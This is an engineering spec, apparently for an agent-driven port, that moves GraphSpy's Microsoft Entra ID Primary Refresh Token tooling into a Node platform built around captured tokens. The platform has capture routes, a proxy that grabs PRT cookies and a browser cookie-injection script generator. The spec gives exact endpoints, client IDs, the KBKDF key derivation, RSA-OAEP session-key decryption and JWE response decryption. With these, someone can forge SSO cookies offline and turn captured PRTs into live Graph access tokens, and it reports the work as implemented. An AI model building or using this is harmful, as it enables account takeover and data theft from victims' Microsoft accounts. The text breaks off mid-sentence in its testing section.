# PRT / Microsoft Entra ID — Integration Spec

> **Working reference implementation:** GraphSpy (`/Users/bms/Downloads/GraphSpy-master`) — Python 3.10 / Flask / Waitress / SQLite.
> **Integration target:** VGenius C Engine (Node.js / Express, `/Users/bms/Downloads/V-C-Engineee-main`).
> **Status (2026-09-30):** All three slices (A/B/C) **implemented** in `backend/services/prtkdf.js` and wired into `devicemanager.js`, `cookieconverter.js`, and `routes/tokens.js` (additive — the existing `Set-Cookie` PRT path is untouched). The KDF byte layout is cross-checked byte-for-byte against Python `cryptography`'s KBKDF (§9). Only **live end-to-end validation** against a real Microsoft tenant remains.

---

## Implementation status (2026-09-30)

| Item | State |
|---|---|
| `backend/services/prtkdf.js` (KDF core + slices A/B/C) | ✅ Implemented; `selfTest()` **12/12 PASS** (incl. cross-checked golden vectors) |
| KBKDF byte layout | ✅ Verified byte-for-byte against Python `cryptography` KBKDF (HMAC-SHA256, counter mode, BeforeFixed, `fixed=None`) — `CRYPTO_CROSSCHECK PASS` |
| `x5c` header format | ✅ `normalizeCertForX5c()` converts PEM → base64(DER); equivalence verified against Node `X509Certificate.raw`; non-PEM input passes through |
| Storage migration (`device_credentials.session_key_encrypted`) | ✅ `backend/database/add_session_key_column.sql`, registered in `server.js` |
| Slice C — `devicemanager.capturePrtSessionKey` + `POST /api/tokens/:id/prt-capture` | ✅ |
| Slice A — `cookieconverter` KDF fast path + `POST /api/tokens/:id/prt-cookie` | ✅ (legacy static-HMAC `buildPRTJwt` kept as fallback with a deprecation warning) |
| Slice B — `POST /api/tokens/:id/prt-token` (PRT → access token, JWE response) | ✅ |
| Live validation (cookie SSO, PRT→AT against Graph, regression of `Set-Cookie`/Kerberos) | ⏳ Pending — requires a live Microsoft account/tenant |

**Run the crypto self-test any time:** `node -e "require('./backend/services/prtkdf').selfTest()"`

---

## Purpose

GraphSpy has a proven, working Primary Refresh Token (PRT) / Microsoft Entra ID flow. The goal is to port the *specific part* of GraphSpy that V-C does **not** already have — the **session-key / KDF half** — into V-C's existing Node/Express platform, so that V-C can:

1. **Generate a valid `x-ms-RefreshTokenCredential` PRT cookie offline** from a captured PRT + session key (no live device-assertion round-trip required).
2. **Turn a PRT directly into a live Microsoft Graph access token** by decrypting the token endpoint's encrypted response.
3. **Derive the session key directly from the captured `session_key_jwe`** (RSA-OAEP) instead of relying on the autologon `x-ms-sessionkey` header.

This document specifies the exact endpoints, request bodies, headers, client IDs, user-agent, cryptographic primitives, and storage so that any engineer (or agent) can implement the chosen slice faithfully and verify it against the working GraphSpy reference.

---

## Executive summary (TL;DR)

- V-C **already** has device registration, a working PRT-cookie path (via `Set-Cookie`), Kerberos TGT derivation, and all PRT storage columns. **Do not re-implement those.**
- The **unique GraphSpy value-add** is a small, self-contained cryptographic core:
  - `decrypt_session_key(session_key_jwe, devicePrivateKey)` → session key bytes (RSA-OAEP / MGF1-SHA1 / SHA1).
  - `calculate_derived_key(sessionKey, context)` → 32-byte key via **KBKDF-HMAC-SHA256, counter mode, label `AzureAD-SecureConversation`** (the `kdf_ver 2` algorithm). **Not** standard HKDF; Node's `crypto.hkdf` will *not* match.
  - `generate_cookie(prt, sessionKey)` → protocol-correct `x-ms-RefreshTokenCredential` JWT.
  - `refresh_to_access_token(prt, sessionKey)` → PRT→access-token with **encrypted (compact JWE) response decryption** (AES-256-GCM or AES-256-CBC).
- V-C's current `cookieconverter.buildPRTJwt` signs with a **static HMAC key** (`a1b2c3d4…`) and no session key / KDF. That fallback path is very likely **non-functional** for work/school accounts. The KDF path replaces/fixes it.
- **Mandatory gate:** before wiring any new KDF code into production, unit-test `calculate_derived_key` against a captured `(session_key, context) → derived_key` / cookie pair taken from the working GraphSpy instance (see §9). This removes all ambiguity about the KDF byte layout.

---

## Table of contents

- §1 Current state — how V-C handles PRT today
- §2 GraphSpy PRT flow (working reference): §2.0 shared primitives · §2.1 device registration · §2.2 `request_for_device` → PRT + session key · §2.3 `refresh_to_access_token` → access token (encrypted response) · §2.4 `generate_cookie` → browser PRT cookie · §2.5 GraphSpy storage schema
- §3 V-C current state ↔ GraphSpy mapping
- §4 The gaps (what GraphSpy adds)
- §5 Integration plan per slice
- §6 KBKDF implementation notes (Node) + validation requirement
- §7 Protocol constants (client IDs, endpoints, UA, win_ver)
- §8 Storage plan in V-C
- §9 Validation / testing plan (against working GraphSpy)
- §10 Security considerations
- Appendix A — exact request/response shapes (copy-paste reference)

---

## §1 Current state — how V-C handles PRT today

V-C already contains a substantial PRT / Kerberos stack. The relevant files and what each does:

| File | Role | PRT-relevant functions |
|---|---|---|
| `backend/services/devicemanager.js` | Device enrollment + PRT cookie via `Set-Cookie` | `registerDevice`, `generateKeyPairAndCsr` (node-forge, CNG `RSA1` blob), `buildClientAssertion` (RS256), `getPrtCookie` (reads `x-ms-RefreshTokenCredential` from `Set-Cookie`), `registerDeviceAndGetPrt`, `refreshPrtCookie`, `storeDeviceCredentials`, `getStoredPrtCookie` |
| `backend/services/cookieconverter.js` | Token → PRT cookie (**GraphSpy KDF method only**) | `generateXmsRefreshTokenCredential`, `getStoredPrtCookie`, `refreshStoredPrtCookie`, `convertTokensToCookies`, `generatePrtCookieInjectionScript` |
| `backend/services/kerberos.js` | PRT → Kerberos TGTs via autologon | `deriveKerberosTGTs`, `deriveCloudTGT` (session key from `x-ms-sessionkey` header), `deriveADTGT`, `validatePrtForKerberos`, `bulkDeriveTGTs` |
| `backend/services/devicecode.js` | Device-code flow (separate, shares keygen/CSR helpers) | `generateKeyPairAndCsr`, `buildClientAssertion` |
| `backend/services/deviceproxy.js` | Captures PRT cookie during a refresh exchange | refresh-token-exchange cookie capture |
| `backend/routes/capture.js` | Token capture; auto-derives Kerberos TGTs | PRT persistence into `captured_tokens` |
| `backend/routes/tokens.js` | `/:id/cookie-script` — stitches stored/refreshed DRS cookie + converter fallback | `refreshStoredPrtCookie` first, then `generateXmsRefreshTokenCredential` fallback |

**Storage already in place** (from `backend/database/*.sql` migrations):
- `captured_tokens.prt`, `.session_key_jwe`, `.client_info`, `.device_tenant_id`, `.tgt_ad`, `.tgt_cloud`, `.kerberos_top_level_names`, `.tgt_cloud_sessionkey`, `.account_type`, `.client_id`, `.token_status`, `.device_id`, `.device_certificate_encrypted`, `.encrypted_private_key`, `.device_enrolled`, `.enrollment_time`
- `device_credentials(id, user_id, tenant_id, device_id, device_certificate_encrypted, encrypted_private_key, prt_cookie_encrypted, user_principal_name, created_at, last_used, updated_at)`

**Client IDs / tenant in V-C today:** `CLIENT_ID = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e'` (work/school), `MSA_CLIENT_ID = '88196af5-e584-4924-b87d-b752fde2c6e3'` (personal), `TENANT = config.AZURE_TENANT || 'common'`. Token endpoints use `/v2.0/token`.

**Key nuance:** V-C's work/school PRT cookie path is *already functional when device credentials are registered* — `tokens.js` first calls `refreshStoredPrtCookie` (the `Set-Cookie` path). The static-HMAC `buildPRTJwt` path is only a **fallback** for when device credentials are absent. That fallback is the primary thing the KDF work fixes, plus it unlocks the PRT→access-token capability (which has **no** V-C equivalent at all).

---

## §2 GraphSpy PRT flow (working reference)

All outbound requests in GraphSpy go through `core/requests_.py`, which: applies the global proxy (setting `verify=False` when a proxy is in use), and for Graph/generic requests adds `Authorization: Bearer <access_token>` + `User-Agent: <ua.get()>`, and retries HTTP 429 honoring `Retry-After` (3 attempts). The PRT/token-specific requests set `User-Agent` explicitly.

### §2.0 Shared primitives

**User-Agent — `core/user_agent.py::get()`** (overridable via the `settings` table, key `user_agent`). Default:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0
```

**Nonce — `core/prt.py::get_srv_challenge_nonce()`**:
```
POST https://login.microsoftonline.com/common/oauth2/token   (form: grant_type=srv_challenge)
→ 200 JSON .Nonce
```
Used as `request_nonce` in every PRT request below. (V-C instead fabricates nonces locally — see §4.)

**KDF — `core/prt.py::calculate_derived_key(session_key: bytes, context: bytes) -> bytes`** (the `kdf_ver 2` core). Verbatim parameters:
```
KBKDFHMAC(algorithm=SHA256, mode=CounterMode, length=32, rlen=4, llen=4,
          location=CounterLocation.BeforeFixed,
          label=b"AzureAD-SecureConversation",
          context=<context bytes>, fixed=None).derive(session_key)
```
⚠️ **This is not standard HKDF.** Node's `crypto.hkdf(...)` produces different bytes. A custom KBKDF-HMAC counter-mode implementation is required and **must be validated** against a captured reference vector (see §6 and §9).

### §2.1 Device registration (prerequisite) — `core/device.py::register`

Produces the device **certificate** + **private key** that later sign the PRT request and decrypt the session key.

1. **Key pair:** RSA-2048, `e = 65537`, PEM (`TraditionalOpenSSL`, unencrypted).
2. **CNG public-key blob** (`generate_public_key_rsa_blob`): 
   `b"RSA1" + u32le(2048) + u32le(len(e)) + u32le(len(n)) + u32le(0) + u32le(0) + e_bytes + n_bytes` → base64. (This is `TransportKey`.)
3. **PKCS10 CSR:** subject `CN = 7E980AD9-B86D-4306-9425-9AC066FB014A`, signed with the private key (SHA-256) → DER → base64. (This is `CertificateRequest.Data`.)
4. **Request:**
   ```
   POST https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0
   Headers:  User-Agent: <ua.get()>
             Authorization: Bearer <access_token>
   JSON: {
     "CertificateRequest": {"Type":"pkcs10","Data":<csr_b64>},
     "TransportKey": <pubkey_cng_b64>,
     "TargetDomain": "e-corp.local",
     "DeviceType": "Windows",
     "OSVersion": "10.0.26100",
     "DeviceDisplayName": "GraphSpy-Device",
     "JoinType": 0,
     "attributes": {"ReuseDevice":"true","ReturnClientSid":"true"}
   }
   ```
5. **Response (200):** JSON with `Certificate.RawBody` (base64 DER). **`device_id` = the `CN` of the returned certificate.**
6. **Store** → `device_certificates (stored_at, device_id, device_name, device_type, join_type, priv_key, certificate)`.

> V-C already implements this faithfully in `devicemanager.js` (`registerDevice` + `generateKeyPairAndCsr` + `encodePublicKeyToBlob` with the `RSA1` magic). **No change needed here** — only consumed.

### §2.2 `request_for_device` → PRT + session key — `core/prt.py::request_for_device(device_id, refresh_token_id, os_version="10.0.26100")`

This is the operation that **obtains the PRT and the session key** in one call (the `windows_api_version 2.2` broker-plugin style exchange).

1. `nonce = get_srv_challenge_nonce()`.
2. Load `refresh_token` + `user` from `refreshtokens` (by id) and device `certificate` + `priv_key` from `device_certificates` (by `device_id`).
3. Build the **request JWT** — **RS256** signed with the device private key, headers `{ "x5c": <certificate_b64>, "kdf_ver": 2 }`, payload:
    > **x5c note (V-C port):** `certificate_b64` is the certificate as **base64(DER)** (standard `x5c` JOSE header convention). V-C stores the cert as PEM, so `prtkdf.normalizeCertForX5c()` converts PEM → base64(DER) before use (equivalence verified against Node `X509Certificate.raw`); non-PEM input is passed through unchanged.
   ```
   {
     "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
     "request_nonce": <nonce>,
     "scope": "openid aza ugs",
     "group_sids": [],
     "win_ver": <os_version>,
     "grant_type": "refresh_token",
     "refresh_token": <refresh_token>
   }
   ```
4. **Request:**
   ```
   POST https://login.microsoftonline.com/common/oauth2/token
   Headers:  User-Agent: <ua.get()>
   form: {
     "windows_api_version": "2.2",
     "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
     "request": <request_jwt>,
     "tgt": False
   }
   ```
5. **Response (200):** JSON containing:
   - `refresh_token` → **this is the PRT**
   - `session_key_jwe` → the encrypted session key
   - `expires_on` → expiry (epoch)
6. **`decrypt_session_key(session_key_jwe, private_key)`**:
   - `seg = session_key_jwe.split(".")[1]` → `base64.urlsafe_b64decode(seg + padding)`.
   - `session_key_bytes = private_key.decrypt(seg_bytes, OAEP(MGF1(SHA1), SHA1, label=None))`.
   - Return `binascii.hexlify(session_key_bytes)` (stored as a **hex string**).
7. **Store** → `primary_refresh_tokens (device_id, user, prt=<refresh_token>, session_key=<hex>, issued_at=<now>, expires_at=<now+refresh_token_expires_in or expires_on>, description)`.

### §2.3 `refresh_to_access_token` → PRT → access token (encrypted response) — `core/prt.py::refresh_to_access_token(prt_id, client_id, resource, scope, refresh_prt, redirect_uri, api_version)`

Turns a stored PRT into a live access token. **The response is not JSON — it is an encrypted compact JWE** that must be decrypted with the session-key-derived key. Defaults: `client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"`, `resource = "https://graph.microsoft.com"`, `api_version = 1`.

1. Load `prt` + `session_key` (hex → bytes) from `primary_refresh_tokens` (by id).
2. `nonce = get_srv_challenge_nonce()`.
3. `context = os.urandom(24)`; `jwt_headers = { "ctx": base64(context), "kdf_ver": 2 }`.
4. **Request JWT payload** (api_version 1):
   ```
   {
     "request_nonce": <nonce>,
     "refresh_token": <prt>,
     "redirect_uri": "ms-appx-web://Microsoft.AAD.BrokerPlugin/<client_id>",
     "grant_type": "refresh_token",
     "client_id": <client_id>,
     "win_ver": "10.0.26100",
     "scope": "openid aza"          # "openid aza" when refresh_prt, else "openid"
     "iss": "aad:brokerplugin",
     "resource": "https://graph.microsoft.com",
     "aud": "login.microsoftonline.com",
     "iat": <now epoch>,
     "exp": <now epoch + 3600>
   }
   ```
   (api_version 2 variant: `scope` = the requested scope, `aud` = `https://graph.microsoft.com/.default`, `iss` = `29d9ed98-…`, plus `prt_protocol_version: 3.0`.)
5. **Derive the signing key** (this is where the KDF is used):
   - `temp_jwt = HS256(payload, os.urandom(32), headers)`  — throwaway, only to get the canonical base64url body.
   - `jbody = temp_jwt.split(".")[1]`; `jwtbody = base64.urlsafe_b64decode(jbody + padding)`.
   - `kdfcontext = SHA256( context ‖ jwtbody )`  (concatenation of the 24-byte context and the payload bytes).
   - `derived_key = calculate_derived_key(session_key, kdfcontext)`.
   - `request_jwt = HS256(payload, derived_key, headers)`.
6. **Request:**
   ```
   POST https://login.microsoftonline.com/common/oauth2/token
   Headers:  User-Agent: <ua.get()>
   form: {
     "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
     "request": <request_jwt>,
     "client_info": "1",
     "windows_api_version": "2.2"
   }
   ```
7. **Decrypt the response (compact JWE — 5 dot-separated segments):** `header, encKey, iv, ciphertext, authtag`.
   - `response_ctx_raw = base64.urlsafe_b64decode( base64url(header) .ctx )`.
   - `response_derived_key = calculate_derived_key(session_key, response_ctx_raw)` — ⚠️ the KDF context here is the **raw** response ctx (NOT SHA256'd), unlike the request.
   - `iv_raw = base64.urlsafe_b64decode(iv)`.
   - If `len(iv_raw) == 12` → **AES-256-GCM** with `response_derived_key`: `decrypt(iv_raw, ciphertext_raw ‖ authtag_raw, AAD = header)`.
   - Else → **AES-256-CBC** with `response_derived_key`: decrypt `(iv_raw, ciphertext_raw)` then **PKCS7** unpad.
8. **Decrypted JSON:** `{ access_token, refresh_token?, refresh_token_expires_in, … }`.
9. **Store:**
   - Always save the `access_token` (`save_access_token`).
   - If `refresh_prt` **and** a `refresh_token` is present → insert a **new PRT** (same `device_id`, `user`, `session_key`, new `issued_at`/`expires_at`).
   - Else if a `refresh_token` is present → save as a normal refresh token.
   - Else → access token only.

### §2.4 `generate_cookie` → the browser PRT cookie — `core/prt.py::generate_cookie(prt_id)`

Produces the `x-ms-RefreshTokenCredential` cookie value that, when set on `login.microsoftonline.com`, grants SSO into any Entra app for ~5 minutes.

1. Load `prt` + `session_key` (hex → bytes) from `primary_refresh_tokens` (by id).
2. `nonce = get_srv_challenge_nonce()`.
3. `context = os.urandom(24)`; `jwt_headers = { "ctx": base64(context), "kdf_ver": 2 }`.
4. **Payload** (minimal — extra claims are rejected):
   ```
   { "refresh_token": <prt>, "is_primary": "true", "request_nonce": <nonce> }
   ```
5. `temp_jwt = HS256(payload, os.urandom(32), headers)` → get body → `jwtbody = base64.urlsafe_b64decode(jbody)`.
6. `kdfcontext = SHA256( context ‖ jwtbody )`.
7. `derived_key = calculate_derived_key(session_key, kdfcontext)`.
8. **`cookie = HS256(payload, derived_key, headers)`** → return the JWT string.
9. **Frontend** (`web/templates/primary_refresh_tokens.html` → `generateAndCopyPrtCookie`): set cookie **name `x-ms-RefreshTokenCredential`**, **value = cookie**, **domain `login.microsoftonline.com`** (user pastes via DevTools → Application → Cookies, in a clean incognito window).

> Note the symmetry: `generate_cookie` (§2.4) and the request in `refresh_to_access_token` (§2.3) build the KDF context identically — `SHA256(context ‖ jwt_body)` — and both sign HS256 with the derived key. The only asymmetry is in §2.3 step 7, where the **response** key is derived from the raw response `ctx`.

### §2.5 GraphSpy storage schema (SQLite)

| Table | Columns (relevant) | Purpose |
|---|---|---|
| `primary_refresh_tokens` | `id, device_id, user, prt, session_key, issued_at, expires_at, description` | The PRT + its session key (hex) — the unit that all three PRT ops read from |
| `device_certificates` | `id, stored_at, device_id, device_name, device_type, join_type, priv_key, certificate` | Device private key + cert (signs PRT request, decrypts session key) |
| `refreshtokens` | `id, stored_at, description, user, tenant_id, client_id, resource, foci, refreshtoken` | Ordinary refresh tokens (input to `request_for_device`) |
| `accesstokens` | `id, …` | Obtained access tokens (output of `refresh_to_access_token`) |
| `settings` | `setting, value` | e.g. `user_agent`, proxy |

---

## §3 V-C current state ↔ GraphSpy mapping

| Capability | GraphSpy | V-C | Verdict |
|---|---|---|---|
| Device registration (CNG blob, CSR, `EnrollmentServer/device`) | `device.py::register` | `devicemanager.js::registerDevice` + `generateKeyPairAndCsr` + `encodePublicKeyToBlob` | ✅ Present, faithful |
| RS256 device client assertion | `prt.py` (via `x5c` header) | `devicemanager.js::buildClientAssertion` | ✅ Present |
| Obtain PRT **cookie** | `generate_cookie` (local KDF) | `devicemanager.js::getPrtCookie` (**from `Set-Cookie`**) | ✅ Present (different, valid mechanism) |
| Obtain **PRT + session key** in one call | `prt.py::request_for_device` | — | ❌ **Gap (Slice C)** |
| **Decrypt `session_key_jwe` → session key** (RSA-OAEP) | `prt.py::decrypt_session_key` | — (uses autologon `x-ms-sessionkey` header instead) | ❌ **Gap (Slice A)** |
| **KBKDF `AzureAD-SecureConversation`** (kdf_ver 2) | `prt.py::calculate_derived_key` | — | ❌ **Gap (core of A/B)** |
| **PRT cookie via KDF** (offline) | `prt.py::generate_cookie` | `cookieconverter.buildPRTJwt` (**static HMAC key, no KDF**) | ⚠️ Present but likely broken → **fix (Slice A)** |
| **PRT → access token (encrypted JWE response)** | `prt.py::refresh_to_access_token` | — | ❌ **Gap (Slice B)** |
| Kerberos TGTs from PRT | — (out of GraphSpy scope) | `kerberos.js` | ✅ Present (V-C bonus) |
| PRT / session_key / client_info / TGT storage | `primary_refresh_tokens` + `device_certificates` | `captured_tokens.*` + `device_credentials` | ✅ Present |
| Cookie → browser console script (PRT only) | `web` frontend | `cookieconverter.js` + `cookieinject.js` | ✅ Present |
| Live `srv_challenge` nonce | `prt.py::get_srv_challenge_nonce` | — (fabricates nonces) | ⚠️ Minor gap |

---

## §4 The gaps (what GraphSpy uniquely adds)

1. **`decrypt_session_key`** — V-C captures and stores `session_key_jwe` but never RSA-OAEP-decrypts it; it gets the session key from the autologon `x-ms-sessionkey` header (requires the PRT to carry `acrs=pfdr`). GraphSpy's method derives it directly from the JWE with the device private key — more reliable, no extra dependency.
2. **`calculate_derived_key` (KBKDF-HMAC-SHA256, counter mode, `AzureAD-SecureConversation`)** — the `kdf_ver 2` core. **Entirely absent** in V-C. Not standard HKDF; `crypto.hkdf` will not match.
3. **Protocol-correct `generate_cookie`** — V-C's `buildPRTJwt` signs with a static HMAC key (`a1b2c3d4…`) and no KDF/session key. That fallback is very likely non-functional for work/school. The KDF cookie is correct and works offline from a captured PRT+session key.
4. **`refresh_to_access_token` with encrypted (compact JWE) response decryption** — no V-C equivalent. Turns a PRT directly into a live Graph access token (AES-256-GCM or AES-256-CBC + PKCS7).
5. **`srv_challenge` live nonce** — V-C fabricates nonces; GraphSpy fetches the live one. Minor, but part of a faithful port.

**Net:** V-C already works via `Set-Cookie` when device credentials exist. The KDF slice (A) fixes the broken static-key fallback and enables offline cookie generation; Slice B adds PRT→access-token; Slice C lets V-C obtain PRT **and** session key in a single call.

---

## §5 Integration plan per slice

All slices are **additive** — they add a new service + optional routes and never modify the working `devicemanager.getPrtCookie` (`Set-Cookie`) path. A new shared module holds the crypto; each slice is an independent, revertible increment.

### Slice A — PRT cookie via KDF (fix the broken fallback; enable offline cookie gen)

**New module** `backend/services/prtkdf.js` (pure crypto, no I/O) exporting:
- `calculateDerivedKey(sessionKeyBuf, contextBuf) -> Buffer` (32 bytes) — §2 KDF. **Must be validated (§6/§9).**
- `decryptSessionKey(sessionKeyJwe, privateKeyPem) -> string(hex)` — RSA-OAEP(MGF1-SHA1, SHA1). Node: `crypto.privateDecrypt({key: pem, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha1'}, segBuf)`.
- `buildPrtCookieJwt(prt, sessionKeyHex, nonce) -> string` — the §2.4 construction (random 24-byte context, `ctx` header, `SHA256(context‖body)`, KDF, HS256).
- `getSrvChallengeNonce(ua) -> Promise<string>` — `POST …/common/oauth2/token` `grant_type=srv_challenge` → `.Nonce` (use existing `services/microsoftclient.js` `ms`).

**Reuse:** the device private key comes from `device_credentials.encrypted_private_key` (decrypt via `utils/encrypt`) — the same key `devicemanager` already stores.

**Wire-in (minimal):**
- `cookieconverter.js`: in `generateXmsRefreshTokenCredential`, when `accountType === 'work_school'` and a **session key** is available, prefer `buildPrtCookieJwt` over `buildPRTJwt`. Keep `buildPRTJwt` only as a last-resort (log a deprecation warning).
- `routes/tokens.js` `/:id/cookie-script`: when the `Set-Cookie` refresh fails and a stored `session_key_jwe` exists, resolve the session key via `decryptSessionKey` (needs the stored device private key) and call `buildPrtCookieJwt`.
- New optional route `POST /api/tokens/:id/prt-cookie` → returns `{ prt_cookie, name:'x-ms-RefreshTokenCredential', domain:'login.microsoftonline.com' }` (mirrors GraphSpy's `/api/generate_prt_cookie`).

**Storage:** store the resolved session key hex in `device_credentials` (new column `session_key_encrypted`, see §8). No new table needed.

### Slice B — PRT → access token (encrypted response decryption)

**Extend** `backend/services/prtkdf.js` with:
- `buildPrtAccessTokenRequest(prt, sessionKeyHex, { clientId, resource, scope, refreshPrt }) -> { requestJwt, form, url, ua, headerCtx }` — §2.3 steps 2–6.
- `decryptPrtResponse(jweString, sessionKeyBuf) -> object` — §2.3 step 7: parse 5 segments, derive response key from raw `ctx`, AES-256-GCM (iv len 12) or AES-256-CBC+PKCS7, return parsed JSON.
- `prtToAccessToken(prtId, opts) -> Promise<{ accessTokenId|accessToken, newPrtId? }>` — orchestrates request + decrypt + persistence.

**New route** `POST /api/tokens/:id/prt-to-access-token` (body: `{ resource?, scope?, client_id?, api_version? }`) → returns the new access token id (and, if `refreshPrt`, the new PRT id). Reuse existing `saveAccessToken`-style persistence in V-C (store into the same token/row the PRT belongs to, or a new access-token record per V-C convention).

**Storage:** access token + (optionally) the refreshed PRT go into `captured_tokens` / `device_credentials` per §8.

### Slice C — device → PRT + session key acquisition (`request_for_device`)

Lets V-C obtain **both** the PRT and the session key in one exchange, rather than relying on `Set-Cookie` (cookie only) + autologon (session key, needs `acrs=pfdr`).

**Extend** `backend/services/prtkdf.js` with:
- `requestPrtForDevice({ refreshToken, devicePrivateKeyPem, deviceCertPem, osVersion, ua }) -> Promise<{ prt, sessionKeyHex, expiresOn }>` — §2.2: build the RS256 request JWT (headers `x5c` + `kdf_ver:2`, payload `client_id=29d9ed98-…`, `scope="openid aza ugs"`, `group_sids:[]`, `win_ver`, `grant_type:"refresh_token"`, `refresh_token`), `POST …/common/oauth2/token` (`windows_api_version:2.2`, `grant_type:jwt-bearer`, `request`, `tgt:False`), then `decryptSessionKey`.
  - Reuse `devicemanager` key material from `device_credentials` (cert + private key). Reuse `buildClientAssertion`/CSR helpers if a fresh device is needed.
- **Route** `POST /api/tokens/:id/acquire-prt` (or extend the existing device flow) → returns/updates the stored PRT + session key.

> Slice C is the "obtain" half; Slice A is the "use the session key to build a cookie" half; Slice B is the "use the session key to get an access token" half. A and B depend on having a session key (from C, or from an already-captured `session_key_jwe`). C → A is the natural build order.

---

## §6 KBKDF implementation notes (Node) + validation requirement

`calculateDerivedKey` is the single most error-prone piece. Requirements:

1. **Not HKDF.** Node's `crypto.hkdf('sha256', ikm, salt, info, 32)` is a different algorithm (RFC 5869) and will **not** match GraphSpy's output. Implement KBKDF-HMAC **counter mode** by hand with `crypto.createHmac('sha256', sessionKey)`.
2. **Verbatim target parameters** (from GraphSpy): `SHA256`, `CounterMode`, output `32` bytes, `rlen=4`, `llen=4`, `CounterLocation.BeforeFixed`, `label="AzureAD-SecureConversation"`, `context=<context>`, `fixed=None`.
3. **Standard SP 800-108 counter-mode construction** (starting point for the Node port):
   ```
   // For i = 1, 2, ... until >= 32 bytes produced, then truncate to 32:
   //   block_i = HMAC-SHA256(sessionKey, counter(i) ‖ label ‖ 0x00 ‖ context ‖ lengthField)
   //   (BeforeFixed => counter is prepended before the fixed part)
   // derived = (block_1 ‖ block_2 ‖ ...) [0:32]
   ```
4. **Mandatory validation before production use** (removes all byte-layout ambiguity — e.g. the exact width of `counter(i)` and `lengthField` derived from `rlen`/`llen`, and whether the length field encodes bits vs bytes). Capture a reference vector from the **working** GraphSpy instance and assert equality (see §9, Test 1). Do **not** ship this KDF without a passing golden test.
5. Keep the function pure and side-effect-free so it is trivially unit-testable and can be pinned with a golden vector.

---

## §7 Protocol constants (single source of truth for the port)

| Item | Value | Source |
|---|---|---|
| PRT **request** client id (`request_for_device`) | `29d9ed98-a469-4536-ade2-f981bc1d605e` | `prt.py::request_for_device` |
| PRT→AT default client id | `d3590ed6-52b3-4102-aeff-aad2292ab01c` | `prt.py::refresh_to_access_token` |
| PRT→AT resource | `https://graph.microsoft.com` | `prt.py::refresh_to_access_token` |
| Token endpoint (all PRT ops + nonce) | `https://login.microsoftonline.com/common/oauth2/token` (v1.0 / `windows_api_version` style, **not** `/v2.0`) | `prt.py` |
| `win_ver` / `OSVersion` | `10.0.26100` | `device.py` / `prt.py` |
| `windows_api_version` | `2.2` | `prt.py` |
| Request scope (`request_for_device`) | `openid aza ugs` | `prt.py` |
| Request scope (`refresh_to_access_token`, refreshPrt) | `openid aza` (else `openid`) | `prt.py` |
| `redirect_uri` (PRT→AT) | `ms-appx-web://Microsoft.AAD.BrokerPlugin/<client_id>` | `prt.py` |
| `iss` (PRT→AT, v1) | `aad:brokerplugin` | `prt.py` |
| Device CSR `CN` | `7E980AD9-B86D-4306-9425-9AC066FB014A` | `device.py` |
| Device `TargetDomain` / `DeviceType` / `JoinType` | `e-corp.local` / `Windows` / `0` | `device.py` |
| KDF label | `AzureAD-SecureConversation` | `prt.py` |
| KDF header marker | `kdf_ver: 2` | `prt.py` |
| Default User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0` | `user_agent.py` |
| PRT cookie name / domain | `x-ms-RefreshTokenCredential` / `login.microsoftonline.com` | `primary_refresh_tokens.html` |
| **V-C** work/school client id (existing) | `config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e'` | `cookieconverter.js` |
| **V-C** personal (MSA) client id (existing) | `88196af5-e584-4924-b87d-b752fde2c6e3` | `cookieconverter.js` |

> Note: V-C currently posts to `/v2.0/token` in `devicemanager.getPrtCookie`. The GraphSpy PRT ops use the v1.0 `common/oauth2/token` endpoint with `windows_api_version=2.2`. Keep these distinct — do not change the existing working `Set-Cookie` call.

---

## §8 Storage plan in V-C

Reuse existing tables/columns; add only what is missing.

| Data | Where it lives in V-C | Notes |
|---|---|---|
| PRT (raw) | `captured_tokens.prt` (encrypted) | Already captured; also in `device_credentials` flow |
| `session_key_jwe` (encrypted session key blob) | `captured_tokens.session_key_jwe` (encrypted) | Already captured — currently **unused** for RSA-OAEP |
| **Decrypted session key (hex)** | **new** `device_credentials.session_key_encrypted` (encrypted) — add via migration | The reusable unit for Slices A/B; store once per user+tenant |
| Device private key (PEM) | `device_credentials.encrypted_private_key` (encrypted) | Already present — needed to decrypt the JWE |
| Device certificate | `device_credentials.device_certificate_encrypted` (encrypted) | Already present — needed for `x5c` / cert CN |
| PRT cookie (from `Set-Cookie` or KDF) | `device_credentials.prt_cookie_encrypted` (encrypted) | Already present |
| `client_info` (uid/utid) | `captured_tokens.client_info` | Already present |
| Obtained access token (Slice B) | existing access-token storage in V-C (per current convention) | follow `tokens.js` persistence |

**Migration (if adopting Slices A/B/C):** add `session_key_encrypted TEXT NULL` to `device_credentials` (plain `ALTER`, no `IF NOT EXISTS`/`AFTER` — the `server.js` runner splits on `;` and wraps each statement in try/catch, so a duplicate-column error is harmless. Match the pattern in `backend/database/add_client_info_column.sql`). Do **not** use `PREPARE/EXECUTE` (the pool does not carry session vars).

---

## §9 Validation / testing plan (against the working GraphSpy instance)

> **Status (2026-09-30):** Test 1 ✅ PASS, Test 2 ✅ PASS (offline round-trip; live GraphSpy-DB cross-check optional). Tests 3–5 ⏳ pending a live Microsoft account/tenant.

The user has a working GraphSpy instance. Use it as the golden reference. Build in this order:

**Test 1 — KBKDF golden vector (blocks everything else).** ✅ **PASS** — resolved stronger than originally planned: instead of capturing vectors from a GraphSpy DB, the Node `calculateDerivedKey` output was cross-checked **byte-for-byte against Python `cryptography`'s KBKDF** (HMAC-SHA256, `CounterMode`, `CounterLocation.BeforeFixed`, `fixed=None`) — `CRYPTO_CROSSCHECK PASS`. Three golden vectors (`ctx_zero32`, `ctx_range24`, `ctx_sha256_hi`) are permanently pinned in `prtkdf.selfTest()`. *(Original plan, kept for reference: from a working GraphSpy DB, pick one `primary_refresh_tokens` row (you have `prt` + `session_key` hex). In a throwaway Python snippet against GraphSpy's own code, compute:)*
